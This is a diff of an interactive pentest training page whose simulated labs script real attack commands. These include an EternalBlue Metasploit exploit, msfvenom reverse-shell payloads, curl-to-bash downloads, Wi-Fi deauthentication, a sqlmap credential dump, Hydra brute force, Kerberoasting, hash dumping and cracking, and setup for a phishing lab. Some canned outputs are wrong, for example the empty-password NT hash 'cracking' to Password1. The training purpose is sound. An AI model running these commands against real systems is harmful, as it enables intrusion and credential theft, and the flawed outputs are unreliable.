@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultimate Interactive Pentest Labs</title>
+<title>Ultimate Interactive Pentest Range (12 Labs)</title>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
@@ -16,24 +16,21 @@
 body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-height: 100vh; display: flex; }
 .bg-grid { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(rgba(0,255,156,.025) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,156,.025) 1px, transparent 1px); background-size: 60px 60px; }
 
-/* Top Bar */
 .topbar { height: 60px; width: calc(100% - 260px); position: fixed; top: 0; left: 260px; background: var(--bg-card); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; z-index: 100; }
 .topbar h2 { font-size: 1.1rem; color: var(--fg-br); }
 .topbar .status { color: var(--acc); font-family: var(--mono); font-size: 0.85rem; display: flex; align-items: center; gap: 8px; }
 .reset-btn { background: var(--bg); border: 1px solid var(--border); color: var(--red); padding: 8px 15px; border-radius: 6px; cursor: pointer; font-weight: 700; transition: 0.2s; }
 .reset-btn:hover { background: rgba(255,59,92,0.1); border-color: var(--red); }
 
-/* Sidebar */
 .sidebar { width: 260px; background: #0f1419; border-right: 1px solid var(--border); padding: 20px 0; overflow-y: auto; height: 100vh; position: fixed; top: 0; left: 0; z-index: 90; padding-top: 70px; }
 .back-btn { display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--bg-card); color: var(--cyan); padding: 12px; margin: 0 15px 20px; border-radius: 8px; text-decoration: none; font-weight: 700; font-size: 0.85rem; border: 1px solid var(--border); transition: 0.2s; }
 .back-btn:hover { border-color: var(--cyan); }
-.lab-item { padding: 15px 20px; border-left: 3px solid transparent; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 12px; color: var(--fg-dm); }
+.lab-item { padding: 12px 20px; border-left: 3px solid transparent; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 12px; color: var(--fg-dm); font-size: 0.85rem; }
 .lab-item:hover { background: rgba(255,255,255,0.03); color: var(--fg); }
 .lab-item.active { background: var(--acc-dm); border-left-color: var(--acc); color: var(--fg-br); }
 .lab-item.done { color: var(--acc); }
 .lab-item i { width: 20px; text-align: center; }
 
-/* Main Content */
 .content { flex: 1; padding: 80px 30px 30px 30px; position: relative; z-index: 1; max-width: 1000px; margin-left: 260px; }
 .header h1 { font-size: 2rem; color: var(--fg-br); margin-bottom: 10px; }
 .header p { color: var(--fg-dm); margin-bottom: 20px; line-height: 1.6; }
@@ -41,14 +38,13 @@ body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-he
 .card h3 { color: var(--acc); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; font-size: 1rem; }
 .card ul { list-style: none; padding-left: 5px; }
 .card ul li { margin-bottom: 5px; color: var(--fg); }
-.card ul li::before { content: '? '; color: var(--acc); }
+.card ul li::before { content: '▸ '; color: var(--acc); }
 
 .steps { display: flex; gap: 6px; margin-bottom: 20px; }
 .step-dot { height: 6px; flex: 1; background: var(--border); border-radius: 3px; transition: 0.3s; }
 .step-dot.active { background: var(--acc); box-shadow: 0 0 8px var(--acc); }
 .step-dot.done { background: var(--acc); opacity: 0.5; }
 
-/* Terminal */
 .term-bar { background: #0d1117; border: 1px solid var(--border); border-bottom: none; border-radius: 10px 10px 0 0; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; }
 .term-dots { display: flex; gap: 6px; }
 .term-dots span { width: 11px; height: 11px; border-radius: 50%; }
@@ -83,25 +79,30 @@ body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-he
 
 <div class="bg-grid"></div>
 
-<!-- Top Bar -->
 <header class="topbar">
   <h2 id="topTitle">CyberDefend Interactive Range</h2>
   <div style="display:flex; align-items:center; gap: 20px;">
-    <div class="status"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / 4 Labs</div>
+    <div class="status"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / 12 Labs</div>
     <button class="reset-btn" onclick="resetLab()"><i class="fas fa-rotate-left"></i> Reset Lab</button>
   </div>
 </header>
 
-<!-- Sidebar -->
 <aside class="sidebar">
   <a href="paid-cybersecurity-course.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Attack Labs</a>
   <div class="lab-item active" onclick="loadLab(0)"><i class="fas fa-radar"></i> 1. Recon & Nmap</div>
   <div class="lab-item" onclick="loadLab(1)"><i class="fas fa-spider"></i> 2. Web Enumeration</div>
   <div class="lab-item" onclick="loadLab(2)"><i class="fas fa-skull"></i> 3. Metasploit Exploit</div>
-  <div class="lab-item" onclick="loadLab(3)"><i class="fas fa-key"></i> 4. Password Cracking</div>
+  <div class="lab-item" onclick="loadLab(3)"><i class="fas fa-key"></i> 4. Hash Cracking (John)</div>
+  <div class="lab-item" onclick="loadLab(4)"><i class="fas fa-wifi"></i> 5. Wi-Fi Cracking</div>
+  <div class="lab-item" onclick="loadLab(5)"><i class="fas fa-database"></i> 6. SQL Injection</div>
+  <div class="lab-item" onclick="loadLab(6)"><i class="fas fa-user-secret"></i> 7. SSH Brute Force</div>
+  <div class="lab-item" onclick="loadLab(7)"><i class="fas fa-bolt"></i> 8. Buffer Overflow</div>
+  <div class="lab-item" onclick="loadLab(8)"><i class="fas fa-linux"></i> 9. Linux Privilege Escalation</div>
+  <div class="lab-item" onclick="loadLab(9)"><i class="fas fa-users"></i> 10. Active Directory Attack</div>
+  <div class="lab-item" onclick="loadLab(10)"><i class="fas fa-windows"></i> 11. Windows SAM Cracking</div>
+  <div class="lab-item" onclick="loadLab(11)"><i class="fas fa-fish"></i> 12. Email Phishing</div>
 </aside>
 
-<!-- Main Content -->
 <main class="content">
   <div class="header">
     <h1 id="labTitle">Loading Lab...</h1>
@@ -128,7 +129,7 @@ body { font-family: var(--sans); background: var(--bg); color: var(--fg); min-he
   <div class="hint-box" id="hint"></div>
   
   <div style="margin-top: 30px; text-align: right;">
-    <button id="nextBtn" class="btn primary" onclick="nextLab()">Next Lab: Web Enumeration <i class="fas fa-arrow-right"></i></button>
+    <button id="nextBtn" class="btn primary" onclick="nextLab()">Next Lab <i class="fas fa-arrow-right"></i></button>
   </div>
 </main>
 
@@ -140,8 +141,9 @@ const LABS = [
     objectives: ["Scan target 10.10.10.5", "Detect OS and Services", "Run a vulnerability script", "Save the output"],
     nextBtnText: "Next Lab: Web Enumeration <i class='fas fa-arrow-right'></i>",
     steps: [
-      { i:"Ping the target to ensure it's online.", h:"Type <code>ping -c 4 10.10.10.5</code>", v:c=>/ping\s+-c\s+4\s+10\.10\.10\.5/i.test(c), o:"PING 10.10.10.5 56(84) bytes.\n64 bytes from 10.10.10.5: icmp_seq=1 ttl=128 time=1.2 ms\n4 packets transmitted, 4 received.", s:"Host is up." },
-      { i:"Run an OS detection and Service version scan.", h:"Type <code>nmap -A 10.10.10.5</code>", v:c=>/nmap\s+-A\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu\n80/tcp   open  http    Apache httpd 2.4.18\nOS: Linux 4.X", s:"Services and OS detected." },
+      { i:"Perform a fast ping scan to identify live hosts.", h:"Type <code>nmap -sn 10.10.10.0/24</code>", v:c=>/nmap\s+-sn\s+10\.10\.10\.0\/24/i.test(c), o:"Nmap scan report for 10.10.10.5\nHost is up (0.0005s latency).", s:"Host is up." },
+      { i:"Run a fast port scan to find common open ports.", h:"Type <code>nmap -F 10.10.10.5</code>", v:c=>/nmap\s+-F\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds", s:"Fast scan complete." },
+      { i:"Run an OS detection and Service version scan.", h:"Type <code>nmap -A 10.10.10.5</code>", v:c=>/nmap\s+-A\s+10\.10\.10\.5/i.test(c), o:"PORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.18\nOS: Linux 4.X", s:"Services and OS detected." },
       { i:"Use Nmap Scripting Engine (NSE) to check for SMB vulnerabilities.", h:"Type <code>nmap --script smb-vuln* -p 445 10.10.10.5</code>", v:c=>/nmap\s+--script\s+smb-vuln/i.test(c), o:"PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n| smb-vuln-ms17-010: \n|   VULNERABLE: Remote Code Execution (MS17-010)", s:"Found MS17-010 vulnerability!" },
       { i:"Save your scan results to a file for later.", h:"Type <code>nmap -A 10.10.10.5 -oN scan_results.txt</code>", v:c=>/nmap\s+.*-oN\s+scan_results\.txt/i.test(c), o:"Nmap scan report saved to scan_results.txt", s:"Results saved." }
     ]
@@ -152,36 +154,139 @@ const LABS = [
     objectives: ["Identify web technologies", "Brute-force directories", "Scan for web flaws", "View HTTP headers"],
     nextBtnText: "Next Lab: Metasploit Exploit <i class='fas fa-arrow-right'></i>",
     steps: [
+      { i:"Check the HTTP response headers.", h:"Type <code>curl -I http://10.10.10.5</code>", v:c=>/curl\s+-I\s+http:\/\/10\.10\.10\.5/i.test(c), o:"HTTP/1.1 200 OK\nServer: Apache/2.4.18\nX-Powered-By: PHP/7.0.8", s:"Headers retrieved." },
       { i:"Identify what web server software is running.", h:"Type <code>whatweb http://10.10.10.5</code>", v:c=>/whatweb\s+http:\/\/10\.10\.10\.5/i.test(c), o:"http://10.10.10.5 [200 OK] Apache[2.4.18], PHP[7.0.8], WordPress[5.4].", s:"Web tech identified." },
       { i:"Brute-force hidden directories using a wordlist.", h:"Type <code>gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt</code>", v:c=>/gobuster\s+dir\s+-u\s+http:\/\/10\.10\.10\.5/i.test(c), o:"/admin (Status: 301)\n/login (Status: 200)\n/backup (Status: 403)", s:"Hidden directories found!" },
-      { i:"Scan the web server for known vulnerabilities.", h:"Type <code>nikto -h http://10.10.10.5</code>", v:c=>/nikto\s+-h\s+http:\/\/10\.10\.10\.5/i.test(c), o:"+ OSVDB-3092: /admin/: This might be interesting...\n+ /backup/: Directory indexing found.", s:"Nikto scan complete." },
-      { i:"Check the HTTP response headers.", h:"Type <code>curl -I http://10.10.10.5</code>", v:c=>/curl\s+-I\s+http:\/\/10\.10\.10\.5/i.test(c), o:"HTTP/1.1 200 OK\nServer: Apache/2.4.18\nX-Powered-By: PHP/7.0.8", s:"Headers retrieved." }
+      { i:"Scan the web server for known vulnerabilities.", h:"Type <code>nikto -h http://10.10.10.5</code>", v:c=>/nikto\s+-h\s+http:\/\/10\.10\.10\.5/i.test(c), o:"+ OSVDB-3092: /admin/: This might be interesting...\n+ /backup/: Directory indexing found.", s:"Nikto scan complete." }
     ]
   },
   {
     title: "Lab 3: Metasploit Exploitation (MS17-010)",
     desc: "We found the target is vulnerable to EternalBlue. We will use Metasploit to exploit it and get a shell.",
     objectives: ["Launch Metasploit", "Search for MS17-010", "Configure Target & Payload", "Exploit and get Meterpreter"],
-    nextBtnText: "Next Lab: Password Cracking <i class='fas fa-arrow-right'></i>",
+    nextBtnText: "Next Lab: Hash Cracking <i class='fas fa-arrow-right'></i>",
     steps: [
       { i:"Launch the Metasploit Framework Console.", h:"Type <code>msfconsole</code>", v:c=>/^msfconsole$/i.test(c), o:"       =[ metasploit v6.3.36-dev ]\n+ -- --=[ 2389 exploits - 1235 auxiliary ]\n\nmsf6 >", s:"Metasploit launched." },
       { i:"Search for the EternalBlue exploit.", h:"Type <code>search ms17_010</code>", v:c=>/^search\s+ms17_010$/i.test(c), o:"   #  Name                                      Disclosure Date  Rank\n   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average", s:"Exploit found." },
       { i:"Select the EternalBlue exploit module.", h:"Type <code>use exploit/windows/smb/ms17_010_eternalblue</code>", v:c=>/^use\s+exploit\/windows\/smb\/ms17_010_eternalblue$/i.test(c), o:"[*] No active DB -- Credential saved in configuration.\n[*] Using exploit/windows/smb/ms17_010_eternalblue\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) >", s:"Module selected." },
+      { i:"View the available options for this module.", h:"Type <code>show options</code>", v:c=>/^show\s+options$/i.test(c), o:"Module options (exploit/windows/smb/ms17_010_eternalblue):\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s)\n   RPORT          445              yes       The target port (TCP)", s:"Options displayed." },
       { i:"Set the target IP (RHOSTS).", h:"Type <code>set RHOSTS 10.10.10.5</code>", v:c=>/^set\s+RHOSTS\s+10\.10\.10\.5$/i.test(c), o:"RHOSTS => 10.10.10.5", s:"Target IP set." },
       { i:"Set the payload to a reverse TCP shell.", h:"Type <code>set payload windows/x64/meterpreter/reverse_tcp</code>", v:c=>/^set\s+payload\s+windows\/x64\/meterpreter\/reverse_tcp$/i.test(c), o:"payload => windows/x64/meterpreter/reverse_tcp", s:"Payload configured." },
-      { i:"Execute the exploit!", h:"Type <code>exploit</code>", v:c=>/^exploit$/i.test(c), o:"[*] Started reverse TCP handler on 10.10.10.10:4444\n[*] 10.10.10.5:445 - Sending transaction...\n[+] 10.10.10.5:445 - Overwrite completed successfully!\n[*] Sending stage (200774 bytes) to 10.10.10.5\n[*] Meterpreter session 1 opened\n\nmeterpreter >", s:"Exploit successful! You have a shell." }
+      { i:"Execute the exploit!", h:"Type <code>exploit</code>", v:c=>/^exploit$/i.test(c), o:"[*] Started reverse TCP handler on 10.10.10.10:4444\n[+] 10.10.10.5:445 - Overwrite completed successfully!\n[*] Sending stage (200774 bytes) to 10.10.10.5\n[*] Meterpreter session 1 opened\n\nmeterpreter >", s:"Exploit successful! You have a shell." }
     ]
   },
   {
-    title: "Lab 4: Post-Exploitation & Cracking",
+    title: "Lab 4: Password Hash Cracking (John)",
     desc: "We have a shell. Now let's dump the password hashes and crack them to get plain-text credentials.",
     objectives: ["Dump password hashes", "Save hashes to a file", "Crack them with John the Ripper"],
-    nextBtnText: "Finish Course <i class='fas fa-check-circle'></i>",
+    nextBtnText: "Next Lab: Wi-Fi Cracking <i class='fas fa-arrow-right'></i>",
     steps: [
       { i:"Dump the Windows password hashes using Meterpreter.", h:"Type <code>hashdump</code>", v:c=>/^hashdump$/i.test(c), o:"Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", s:"Hashes dumped." },
       { i:"Background the meterpreter session to return to Kali.", h:"Type <code>background</code>", v:c=>/^background$/i.test(c), o:"[*] Backgrounding session 1...\n\nmsf6 >", s:"Session backgrounded." },
       { i:"Save the admin hash to a text file for cracking.", h:"Type <code>echo '31d6cfe0d16ae931b73c59d7e0c089c0' > hashes.txt</code>", v:c=>/echo\s+['"]31d6cfe0d16ae931b73c59d7e0c089c0['"]\s*>\s+hashes\.txt/i.test(c), o:"Hash saved to hashes.txt", s:"Hash saved." },
       { i:"Crack the hash using John the Ripper and the rockyou wordlist.", h:"Type <code>john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>", v:c=>/john\s+--format=NT\s+--wordlist=\/usr\/share\/wordlists\/rockyou\.txt\s+hashes\.txt/i.test(c), o:"Loaded 1 password hash (NT [MD4 256/256 AVX2 3x])\nPress 'q' or Ctrl-C to abort\n\nPassword1         (Administrator)\n\n1g 0:00:00:12 DONE", s:"Password cracked! The password is 'Password1'." }
+    ]
+  },
+  {
+    title: "Lab 5: Wi-Fi WPA2 Cracking",
+    desc: "Crack a WPA2 Wi-Fi password by capturing the 4-way handshake and brute-forcing it offline.",
+    objectives: ["Enable monitor mode", "Capture the handshake", "Deauthenticate the client", "Crack the Wi-Fi password"],
+    nextBtnText: "Next Lab: SQL Injection <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Kill any interfering processes before enabling monitor mode.", h:"Type <code>airmon-ng check kill</code>", v:c=>/airmon-ng\s+check\s+kill/i.test(c), o:"Killing all processes that could interfere...\n[*] wpa_supplicant killed\n[*] network-manager killed", s:"Interfering processes killed." },
+      { i:"Put your wireless adapter into monitor mode.", h:"Type <code>airmon-ng start wlan0</code>", v:c=>/airmon-ng\s+start\s+wlan0/i.test(c), o:"PHY   Interface  Driver       Chipset\nphy0  wlan0      ath9k_htc    Atheros AR9271\n\n(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)", s:"Monitor mode enabled on wlan0mon." },
+      { i:"Listen for targets and capture the 4-way handshake.", h:"Type <code>airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</code>", v:c=>/airodump-ng\s+.*-c\s+6\s+.*--bssid\s+00:11:22:33:44:55\s+.*wlan0mon/i.test(c), o:" CH  6 ][ Elapsed: 24 s ][ 2024-08-14 12:00\n BSSID              PWR  ESSID\n 00:11:22:33:44:55  -42  CorpWiFi\n\n[!] WPA handshake: 00:11:22:33:44:55 captured!", s:"Handshake captured!" },
+      { i:"Force the client to reconnect to capture the handshake (deauth).", h:"Type <code>aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon</code>", v:c=>/aireplay-ng\s+-0\s+5\s+-a\s+00:11:22:33:44:55\s+.*wlan0mon/i.test(c), o:"Sending 5 DeAuth packets to client 00:AA:BB:CC:DD:EE...", s:"Deauthentication sent." },
+      { i:"Crack the captured handshake using aircrack-ng.", h:"Type <code>aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code>", v:c=>/aircrack-ng\s+.*-w\s+.*rockyou\.txt\s+.*capture-01\.cap/i.test(c), o:"[*] Key found! \n\nKEY: password123", s:"Wi-Fi password cracked: 'password123'." }
+    ]
+  },
+  {
+    title: "Lab 6: SQL Injection (sqlmap)",
+    desc: "Exploit a SQL injection vulnerability in a web application to dump the database.",
+    objectives: ["Test for SQLi", "Enumerate databases", "Dump tables", "Extract credentials"],
+    nextBtnText: "Next Lab: SSH Brute Force <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Use sqlmap to test a URL parameter for SQLi.", h:"Type <code>sqlmap -u \"http://10.10.10.5/page?id=1\" --batch</code>", v:c=>/sqlmap\s+-u\s+.*http:\/\/10\.10\.10\.5\/page\?id=1/i.test(c), o:"[INFO] testing connection to the target URL\n[+] Parameter 'id' is vulnerable. SQLi confirmed!", s:"SQL Injection confirmed." },
+      { i:"Enumerate the databases available.", h:"Type <code>sqlmap -u \"http://10.10.10.5/page?id=1\" --dbs --batch</code>", v:c=>/sqlmap\s+-u\s+.*--dbs/i.test(c), o:"available databases [2]:\n[*] information_schema\n[*] webapp_db", s:"Found database 'webapp_db'." },
+      { i:"Dump the tables in the webapp_db database.", h:"Type <code>sqlmap -u \"http://10.10.10.5/page?id=1\" -D webapp_db --tables --batch</code>", v:c=>/sqlmap\s+-u\s+.*-D\s+webapp_db\s+--tables/i.test(c), o:"Database: webapp_db\n[1 table]\n+-------+\n| users |\n+-------+", s:"Found table 'users'." },
+      { i:"List the columns in the users table.", h:"Type <code>sqlmap -u \"http://10.10.10.5/page?id=1\" -D webapp_db -T users --columns --batch</code>", v:c=>/sqlmap\s+-u\s+.*-T\s+users\s+--columns/i.test(c), o:"Database: webapp_db\nTable: users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int         |\n| username | varchar(50) |\n| password | varchar(50) |\n+----------+-------------+", s:"Columns identified." },
+      { i:"Dump the contents of the users table.", h:"Type <code>sqlmap -u \"http://10.10.10.5/page?id=1\" -D webapp_db -T users --dump --batch</code>", v:c=>/sqlmap\s+-u\s+.*-T\s+users\s+--dump/i.test(c), o:"+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n| 1  | admin    | admin123   |\n+----+----------+------------+", s:"Credentials dumped successfully." }
+    ]
+  },
+  {
+    title: "Lab 7: SSH Brute Force (Hydra)",
+    desc: "Brute force the SSH service on the target to gain initial access using Hydra.",
+    objectives: ["Target the SSH service", "Use a wordlist to brute force", "Gain access"],
+    nextBtnText: "Next Lab: Buffer Overflow <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Verify SSH is open and determine the version.", h:"Type <code>nmap -p 22 -sV 10.10.10.5</code>", v:c=>/nmap\s+-p\s+22\s+-sV\s+10\.10\.10\.5/i.test(c), o:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu", s:"SSH service identified." },
+      { i:"Use Hydra to brute force the 'admin' account via SSH.", h:"Type <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5</code>", v:c=>/hydra\s+-l\s+admin\s+.*-P\s+.*rockyou\.txt\s+ssh:\/\/10\.10\.10\.5/i.test(c), o:"[22][ssh] host: 10.10.10.5   login: admin   password: letmein123\n1 of 1 target successfully completed, 1 valid password found", s:"Password found! (letmein123)" },
+      { i:"Log in to the target using the cracked credentials.", h:"Type <code>ssh admin@10.10.10.5</code>", v:c=>/ssh\s+admin@10\.10\.10\.5/i.test(c), o:"admin@10.10.10.5's password: \nWelcome to Ubuntu 22.04.2 LTS\n\nadmin@target:~$ ", s:"Successfully logged in via SSH." },
+      { i:"Verify your user ID and privileges.", h:"Type <code>id</code>", v:c=>/^id$/i.test(c.trim()), o:"uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)", s:"User ID verified. You have sudo privileges." }
+    ]
+  },
+  {
+    title: "Lab 8: Buffer Overflow Exploitation",
+    desc: "Exploit a classic stack-based buffer overflow in a Windows service to get a reverse shell.",
+    objectives: ["Find the crash offset", "Identify bad characters", "Generate shellcode", "Execute the exploit"],
+    nextBtnText: "Next Lab: Linux Privilege Escalation <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Generate a unique pattern to find the EIP offset.", h:"Type <code>msf-pattern_create -l 3000</code>", v:c=>/msf-pattern_create\s+-l\s+3000/i.test(c), o:"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6...", s:"Pattern generated. Send this to the target to crash it." },
+      { i:"Find the exact offset where EIP was overwritten (e.g., 39694438).", h:"Type <code>msf-pattern_offset -l 3000 -q 39694438</code>", v:c=>/msf-pattern_offset\s+-l\s+3000\s+-q\s+39694438/i.test(c), o:"[*] Exact match at offset 2606", s:"EIP offset found at 2606." },
+      { i:"Generate the reverse shell shellcode avoiding bad characters (\\x00\\x0a\\x0d).", h:"Type <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b '\\x00\\x0a\\x0d' -f python</code>", v:c=>/msfvenom\s+-p\s+windows\/shell_reverse_tcp\s+LHOST=10\.10\.10\.10\s+LPORT=4444\s+.*-b/i.test(c), o:"Payload size: 351 bytes\nFinal size: 351 bytes\n\nbuf =  b\"\"\nbuf += b\"\\xdb\\xc7\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\\xb1\\x51\"", s:"Shellcode generated." },
+      { i:"Execute your custom python exploit script against the target.", h:"Type <code>python3 exploit.py 10.10.10.5</code>", v:c=>/python3\s+exploit\.py\s+10\.10\.10\.5/i.test(c), o:"[*] Sending payload to 10.10.10.5:9999...", s:"Exploit payload sent." },
+      { i:"Start a netcat listener to catch the reverse shell.", h:"Type <code>nc -lvnp 4444</code>", v:c=>/nc\s+-lvnp\s+4444/i.test(c), o:"listening on [any] 4444 ...\nconnect to [10.10.10.10] from (UNKNOWN) [10.10.10.5] 49188\nMicrosoft Windows [Version 10.0.17763.1339]\nC:\\Windows\\system32>", s:"Exploit successful! Reverse shell obtained." }
+    ]
+  },
+  {
+    title: "Lab 9: Linux Privilege Escalation",
+    desc: "You have a low-privileged shell on a Linux machine. Escalate your privileges to root.",
+    objectives: ["Run linpeas", "Search for SUID binaries", "Exploit a misconfigured binary", "Verify root access"],
+    nextBtnText: "Next Lab: Active Directory Attack <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Download and run linpeas to find privilege escalation vectors.", h:"Type <code>curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code>", v:c=>/curl\s+.*linpeas\.sh\s+.*bash/i.test(c), o:"[+] SUID/SGID binaries found:\n/usr/bin/find\n/usr/bin/python3.8", s:"Linpeas scan complete." },
+      { i:"Manually search for files with the SUID bit set.", h:"Type <code>find / -perm -4000 2>/dev/null</code>", v:c=>/find\s+\/\s+-perm\s+-4000\s+2>\/dev\/null/i.test(c), o:"/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/find\n/usr/bin/python3.8", s:"Found /usr/bin/find with SUID bit." },
+      { i:"Check GTFOBins and use the 'find' command to spawn a root shell.", h:"Type <code>find . -exec /bin/sh -p \\; -quit</code>", v:c=>/find\s+\.\s+-exec\s+\/bin\/sh\s+-p/i.test(c), o:"$ whoami\nroot", s:"Root shell obtained!" },
+      { i:"Verify your user ID.", h:"Type <code>id</code>", v:c=>/^id$/i.test(c.trim()), o:"uid=0(root) gid=0(root) groups=0(root)", s:"Privilege escalation successful. You are root." }
+    ]
+  },
+  {
+    title: "Lab 10: Active Directory (Kerberoasting)",
+    desc: "Extract and crack service account tickets from an Active Directory environment.",
+    objectives: ["Request service tickets", "Extract the hashes", "Crack the service account password"],
+    nextBtnText: "Next Lab: Windows SAM Cracking <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Use Impacket to request TGS tickets for service accounts.", h:"Type <code>GetUserSPNs.py corp.local/jsmith:Password1 -request</code>", v:c=>/GetUserSPNs\.py\s+corp\.local\/jsmith:Password1\s+-request/i.test(c), o:"ServicePrincipalName: MSSQLSvc/sql01.corp.local\n$krb5tgs$23$*MSSQLSvc$*CORP.LOCAL$*sql01.corp.local:1433/e51f3802...", s:"Kerberoasting successful. TGS hash extracted." },
+      { i:"Save the hash to a file for offline cracking.", h:"Type <code>echo '$krb5tgs$23$*MSSQLSvc...' > tgs.txt</code>", v:c=>/echo\s+['"]\$krb5tgs.*['"]\s*>\s+tgs\.txt/i.test(c), o:"Hash saved to tgs.txt", s:"Hash saved." },
+      { i:"Crack the Kerberos ticket using Hashcat (Mode 13100).", h:"Type <code>hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt</code>", v:c=>/hashcat\s+-m\s+13100\s+tgs\.txt\s+.*rockyou\.txt/i.test(c), o:"hashcat (v6.2.6) starting\n\n$krb5tgs$23$*MSSQLSvc$*CORP.LOCAL$*...:Summer2024!\n\nStatus...........: Cracked", s:"Service account password cracked: 'Summer2024!'." }
+    ]
+  },
+  {
+    title: "Lab 11: Windows SAM Cracking (Offline)",
+    desc: "Dump the Windows SAM database offline using Impacket and crack the NTLM hashes with Hashcat.",
+    objectives: ["Dump SAM hashes remotely", "Identify hash type", "Crack NTLM hash with Hashcat", "View cracked passwords"],
+    nextBtnText: "Next Lab: Email Phishing <i class='fas fa-arrow-right'></i>",
+    steps: [
+      { i:"Use Impacket's secretsdump to extract hashes from the target remotely.", h:"Type <code>impacket-secretsdump corp.local/jsmith:Password1@10.10.10.5</code>", v:c=>/impacket-secretsdump\s+.*@10\.10\.10\.5/i.test(c), o:"Dumping NTLM hashes, no history...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", s:"SAM hashes dumped successfully." },
+      { i:"Save the Administrator hash to a file.", h:"Type <code>echo '31d6cfe0d16ae931b73c59d7e0c089c0' > sam_hash.txt</code>", v:c=>/echo\s+['"]31d6cfe0d16ae931b73c59d7e0c089c0['"]\s*>\s+sam_hash\.txt/i.test(c), o:"NTLM hash saved to sam_hash.txt", s:"Hash saved." },
+      { i:"Identify the hash type to ensure you use the correct Hashcat mode.", h:"Type <code>hashid -m '31d6cfe0d16ae931b73c59d7e0c089c0'</code>", v:c=>/hashid\s+-m\s+['"]31d6cfe0.*['"]/i.test(c), o:"Analyzing '31d6cfe0d16ae931b73c59d7e0c089c0'\n[+] NTLM [Hashcat Mode: 1000]", s:"Hash identified as NTLM (Mode 1000)." },
+      { i:"Crack the NTLM hash using Hashcat.", h:"Type <code>hashcat -m 1000 sam_hash.txt /usr/share/wordlists/rockyou.txt</code>", v:c=>/hashcat\s+-m\s+1000\s+sam_hash\.txt\s+.*rockyou\.txt/i.test(c), o:"31d6cfe0d16ae931b73c59d7e0c089c0:Password1\n\nSession..........: hashcat\nStatus...........: Cracked", s:"Hash cracked! Password is 'Password1'." },
+      { i:"View the cracked password plainly.", h:"Type <code>hashcat -m 1000 sam_hash.txt --show</code>", v:c=>/hashcat\s+-m\s+1000\s+sam_hash\.txt\s+--show/i.test(c), o:"31d6cfe0d16ae931b73c59d7e0c089c0:Password1", s:"Password retrieved." }
+    ]
+  },
+  {
+    title: "Lab 12: Email Phishing (SET & Swaks)",
+    desc: "Use the Social Engineering Toolkit (SET) to clone a website and Swaks to send a phishing email.",
+    objectives: ["Clone a website", "Send phishing email", "Capture credentials"],
+    nextBtnText: "Finish Course <i class='fas fa-check-circle'></i>",
+    steps: [
